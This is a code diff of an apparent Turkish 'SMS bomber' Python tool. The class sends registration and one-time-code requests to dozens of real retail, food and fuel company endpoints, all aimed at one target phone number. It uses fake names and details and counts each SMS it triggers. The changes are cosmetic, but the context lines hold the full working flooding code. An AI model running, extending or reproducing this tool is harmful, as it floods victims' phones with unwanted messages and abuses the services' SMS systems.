@@ -51,7 +51,7 @@ class SendSms():
                 BeautifulSoup(dsmartgo.text, "html.parser").find("div", {"class": "info-text"}).text.strip()
                 print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> dsmartgo.com.tr")
             except AttributeError:
-                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> dsmartgo.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> dsmartgo.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                 self.adet += 1
                 self.toplam_sms += 1
             uygulanan_nolar += 1
@@ -80,7 +80,7 @@ class SendSms():
                     "next": ""
                 })
                     if kigili.status_code == 202:
-                         print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> kigili.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                         print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> kigili.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                          self.adet += 1
                          self.toplam_sms += 1
                     else:
@@ -107,7 +107,7 @@ class SendSms():
                     "token_type": "register_token"
                 })
                     if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> core.kahvedunyasi.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> core.kahvedunyasi.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -142,7 +142,7 @@ class SendSms():
                     "confirm": "true"
                 })
                     if naosstars.status_code == 202:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> shop.naosstars.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> shop.naosstars.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -176,7 +176,7 @@ class SendSms():
                     "phone": f"0{numara}"
                 })
                     if wmf.status_code == 202:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> wmf.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> wmf.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -201,7 +201,7 @@ class SendSms():
                     json={"operationName": "SendOtp2", "query": "mutation SendOtp2($phoneNumber: String!) {\n  sendOtp2(phoneNumber: $phoneNumber) {\n    __typename\n    alreadySent\n    remainingTime\n  }\n}", "variables": {"phoneNumber": "90"+str(numara)}}
                     r = requests.post("https://prod.fasapi.net:443/",  json=json)
                     if (r.json()["data"]["sendOtp2"]["alreadySent"]) == False:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> prod.fasapi.net "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> prod.fasapi.net "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -225,7 +225,7 @@ class SendSms():
                 try:
                     bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": numara})
                     if bim.status_code == 200:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bim.veesk.net "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> bim.veesk.net "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -250,7 +250,7 @@ class SendSms():
                 try:
                     r = requests.post("https://api.ceptesok.com:443/api/users/sendsms",  json={"mobile_number": numara, "token_type": "register_token"})
                     if len(r.json()["meta"]["messages"]["success"]) != 0:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.ceptesok.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> api.ceptesok.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -281,7 +281,7 @@ class SendSms():
                             }
                     tiklagelsin = requests.post("https://svc.apps.tiklagelsin.com:443/user/graphql", json=json)
                     if tiklagelsin.json()["data"]["generateOtp"] == True:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> svc.apps.tiklagelsin.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> svc.apps.tiklagelsin.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -309,7 +309,7 @@ class SendSms():
                     data = {"phone": f"0{numara}", "next": "/a101-kapida"}
                     r = requests.post(url,data=data)
                     if (r.status_code) == 200:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> a101.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> a101.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -333,7 +333,7 @@ class SendSms():
                     data = {"first_name": "Memati", "last_name": "Bas", "email": self.mail, "phone": f"0{numara}", "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}
                     home = requests.post("https://www.englishhome.com:443/enh_app/users/registration/", data=data)
                     if home.status_code == 202:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> englishhome.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> englishhome.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -358,7 +358,7 @@ class SendSms():
                     data = {"phone": numara}
                     su = requests.post("https://www.sakasu.com.tr:443/app/api_register/step1", data=data)
                     if su.json()["status"] == "ok":
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> sakasu.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> sakasu.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -385,7 +385,7 @@ class SendSms():
                     json={"appleId": None, "code": "", "email": "", "facebookId": None, "googleId": None, "lastName": "", "name": "", "phone": numara, "type": 1}
                     rentiva = requests.post(url, headers=headers, json=json)
                     if rentiva.json()["success"] == True:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> rentiva.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> rentiva.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -411,7 +411,7 @@ class SendSms():
                     headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
                     bineq = requests.post(url, headers=headers)
                     if bineq.json()["IsSuccess"] == True:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> bineqapi.heymobility.tech "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> bineqapi.heymobility.tech "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -438,7 +438,7 @@ class SendSms():
                     json={"phone_number": f"+90{numara}"}
                     link = requests.post(url, json=json)
                     if link.json()["detail"] == "Ok":
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> consumer-auth.linkfleet.de "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> consumer-auth.linkfleet.de "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -465,7 +465,7 @@ class SendSms():
                     json={"Address": numara, "ConfirmationType": 0}
                     lonca = requests.post("https://www.loncamarket.com/lid/identity/sendconfirmationcode", headers=headers, json=json, verify=False, timeout=3)
                     if lonca.status_code == 200:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> loncamarket.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> loncamarket.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -492,7 +492,7 @@ class SendSms():
                     data = {"loginIdentityNumber": "00000000000", "loginMobileNumber": numara}
                     dgn = requests.post(url, headers=headers, data=data)
                     if dgn.status_code == 200:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> odeme.dgnonline.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> odeme.dgnonline.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -520,7 +520,7 @@ class SendSms():
                     json={"action": "create", "email": f"{self.random_mail}@yaani.com", "language": "tr", "recovery_options": [{"type": "email", "value": self.mail}, {"type": "msisdn", "value": f"90{numara}"}]}
                     r = requests.post(url, headers=headers, json=json)
                     if r.status_code == 204:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.yaanimail.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> api.yaanimail.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -548,7 +548,7 @@ class SendSms():
                     data = {"mobilePhone": numara}
                     r = requests.post(url, headers=headers, data=data)
                     if r.json()["Data"]["IsSMSSend"] == True:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> defacto.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> defacto.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -572,7 +572,7 @@ class SendSms():
                 try:
                     r = requests.get(f"https://mopas.com.tr/sms/activation?mobileNumber={numara}&pwd=&checkPwd=")
                     if r.status_code == 200:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mopas.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> mopas.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -599,7 +599,7 @@ class SendSms():
                     json={"params": {"application": "icq", "devId": "ic1rtwz1s1Hj1O0r", "language": "en-US", "phone": f"90{numara}", "route": "sms"}, "reqId": "25299-1669396271"}
                     r = requests.post(url, headers=headers, json=json)
                     if r.json()["status"]["code"] == 20000:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> u.icq.net "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> u.icq.net "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -627,7 +627,7 @@ class SendSms():
                     json={"Captcha": "", "CaptchaTurn": False, "ConfirmNewPassword": "31ABC..abc31", "isGuestQuickBuy": "false", "Main": {"CellPhone": numara, "day": "31", "Email": self.mail, "FirstName": "Memati", "genderid": "1", "LastName": "Baş", "month": "12", "ReceiveCampaignMessages": True, "year": 1972}, "MembershipAgreement": True, "MembershipAgreementClone": True, "NewPassword": "31ABC..abc31", "ReturnUrl": "/"}
                     r = requests.post(url, headers=headers, json=json)
                     if r.json()["Success"] == True:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> boyner.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> boyner.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -655,7 +655,7 @@ class SendSms():
                     json={"countryCode": "TR", "phoneNumber": numara}
                     r = requests.post(url, headers=headers, json=json)
                     if r.status_code == 201:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> watsons.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> watsons.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -682,7 +682,7 @@ class SendSms():
                     data = f"--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"fonksiyon\"\r\n\r\ncustomer/form/check\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"method\"\r\n\r\nPOST\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M\r\ncontent-disposition: form-data; name=\"telephone\"\r\n\r\n{numara}\r\n--m-oxX0qIMHx4yq53IDWOLqk3y0LtyUo0O6o5gtQi3bbjTC6Q69mKx5X5k.aSXRo1J7MU3M--\r\n"
                     r = requests.post(url, headers=headers, data=data)
                     if (r.status_code) == 200:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> app.buyursungelsin.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> app.buyursungelsin.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -708,7 +708,7 @@ class SendSms():
                 try:
                     r = requests.get(f"https://osmgck.idealdata.com.tr:7850/X%02REQ_SMSDEMO%02{self.mail}%020{numara}")
                     if r.status_code == 200:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> osmgck.idealdata.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> osmgck.idealdata.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -735,7 +735,7 @@ class SendSms():
                     json={"MobilePhone": numara}
                     r = requests.post(url, headers=headers, json=json)
                     if r.text == "true":
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> pinarsumobileservice.yasar.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> pinarsumobileservice.yasar.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -763,7 +763,7 @@ class SendSms():
                     data = {"action": "register", "gsm": numara}
                     r = requests.post(url, headers=headers, data=data)
                     if r.json()["code"] == "common.success":
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> suiste.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> suiste.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -790,7 +790,7 @@ class SendSms():
                     json={"mobilePhoneNumber": numara}
                     r = requests.post(url, json=json)
                     if (r.json()["IsSuccessful"]) == True:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> hayatsu.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> hayatsu.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -815,7 +815,7 @@ class SendSms():
                 try:
                     r = requests.post("https://api.pisir.com:443/v1/login/",  json={"app_build": "343", "app_platform": "ios", "msisdn": numara})
                     if r.json()["ok"] == "1":
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.pisir.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> api.pisir.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -840,7 +840,7 @@ class SendSms():
                 try:
                     r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{numara}"})
                     if r.status_code == 200:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -867,7 +867,7 @@ class SendSms():
                     json={"accounttype": 1, "email": self.mail, "isAddPermission": True, "lastName": "Bas", "name": "Memati", "phone": numara}
                     r = requests.post(url, json=json)
                     if (r.json()["isSucceed"]) == True:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> apigw.ikinciyeni.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> apigw.ikinciyeni.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -894,7 +894,7 @@ class SendSms():
                     json={"email": self.mail, "emailPermitted": True, "kvkApproved": True, "name": "Memati", "phone": str(numara), "smsPermitted": True, "surname": "Bas", "userAgreementApproved": True}
                     r = requests.post(url,  json=json)
                     if (r.status_code) == 201:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> api.terrapizza.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> api.terrapizza.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -923,7 +923,7 @@ class SendSms():
                     json={"birthDate": "31/08/1975", "carPlate": "31 ABC 31", "name": "Memati Bas", "otp": "", "phoneNumber": str(numara), "playerId": ""}
                     r = requests.post(url, json=json)
                     if (r.json()["phoneNumber"]) == str(numara):
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> ipapp.ipragaz.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> ipapp.ipragaz.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -950,7 +950,7 @@ class SendSms():
                     json={"address": "", "birthDate": "31-08-1975", "city": 0, "deviceCode": "839C5FAF-A7C1-2CDA--6F5414AD2228", "district": 0, "email": self.mail, "isUserAgreement": True, "name": "Memati", "password": "", "phone": numara, "productType": 1, "subscription": True, "surname": "Bas"}
                     r = requests.post(url, json=json)
                     if (r.json()["messageCode"]) == "OK":
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mogazmobilapinew.aygaz.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> mogazmobilapinew.aygaz.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -974,7 +974,7 @@ class SendSms():
                 try:
                     r = requests.get(f"https://gomobilapp.ipragaz.com.tr:443/api/v1/0/authentication/sms/send?phone={numara}&isRegistered=true")
                     if (r.json()["data"]["success"]) == True:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> gomobilapp.ipragaz.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
+                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> gomobilapp.ipragaz.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                     else:
@@ -1002,7 +1002,7 @@ class SendSms():
                     json={"approvedContractVersion": "v1", "approvedKvkkVersion": "v1", "contractPermission": True, "deviceId": "", "etkContactPermission": True, "kvkkPermission": True, "mobilePhone": f"0{numara}", "name": "Memati", "plate": "31ABC31", "positiveCard": "", "referenceCode": "", "surname": "Bas"}
                     r = requests.post(url, headers=headers, json=json)
                     if r.status_code == 204:
-                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! --> mobilapi.petrolofisi.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
